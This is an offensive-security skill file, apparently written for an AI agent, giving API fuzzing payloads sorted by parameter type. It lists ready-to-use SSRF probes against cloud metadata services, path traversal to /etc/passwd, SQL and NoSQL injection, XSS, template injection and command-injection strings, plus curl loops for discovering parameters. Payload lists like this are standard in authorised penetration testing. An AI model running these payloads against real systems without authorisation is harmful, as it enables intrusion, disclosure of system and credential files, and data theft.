---
name: api-fuzz
description: >
  API semantic fuzzing payload templates. Provides intelligent
  payload selection based on parameter semantic type rather
  than blind fuzzing. Covers IDOR, SQLi, XSS, SSRF, SSTI,
  command injection, and business logic payloads.
metadata:
  tags: "api,fuzz,payloads,idor,sqli,xss,ssrf,ssti"
  category: "offensive-security"
---

# API Fuzz Payloads — By Parameter Semantic Type

## ID/Number Type Parameters
```
id=1,2,3,100,999999
id=null  id=0  id=-1  id[]=1  id[]=1&id[]=2
id[$gt]=0  id[$ne]=1  id[$regex]=.*
```

## URL/Path/File Type Parameters
```
# SSRF
url=http://127.0.0.1
url=http://[::1]
url=http://169.254.169.254/latest/meta-data/   (AWS)
url=http://metadata.google.internal/            (GCP)
url=file:///etc/passwd
url=gopher://127.0.0.1:25/
url=dict://127.0.0.1:6379/

# Path traversal
file=../../../etc/passwd
file=....//....//....//etc/passwd
file=/etc/passwd%00.jpg
file=php://filter/convert.base64-encode/resource=index.php
```

## Search/Query Type Parameters
```
# SQLi
q=1' OR '1'='1
q=1' UNION SELECT 1,2,3--
q=1' AND SLEEP(5)--
q=1'; WAITFOR DELAY '0:0:5'--

# XSS
q=<script>alert(1)</script>
q=<img src=x onerror=alert(1)>
q=<svg onload=alert(1)>
q=javascript:alert(1)
```

## Template/Content Type Parameters
```
# SSTI
template={{7*7}}
template={{config}}
template=${{7*7}}
template=<%= 7*7 %>
```

## Command Type Parameters
```
cmd=; id
cmd=| id
cmd=`id`
cmd=$(id)
cmd=|| id
cmd=& id
cmd=\n id
```

## Amount/Price/Quantity Type Parameters
```
# Business logic
amount=0  amount=-1  amount=0.01
quantity=0  quantity=-1  quantity=999999
price=0  price=0.00
```

## Parameter Discovery Methods

```bash
# Method 1: Append params, watch response size
for param in id uid page limit search q role status; do
    len=$(curl -s "$BASE?$param=1" | wc -c)
    echo "$param → $len bytes"
done

# Method 2: POST empty JSON, read error
curl -s -X POST "$BASE" -H "Content-Type: application/json" -d '{}'
# "missing required field: username" → param name leaked

# Method 3: Content-Type variants
curl -X POST "$BASE" -H "Content-Type: application/json" -d '{"id":1}'
curl -X POST "$BASE" -H "Content-Type: application/xml" -d '<id>1</id>'
curl -X POST "$BASE" -H "Content-Type: application/x-www-form-urlencoded" -d 'id=1'
```
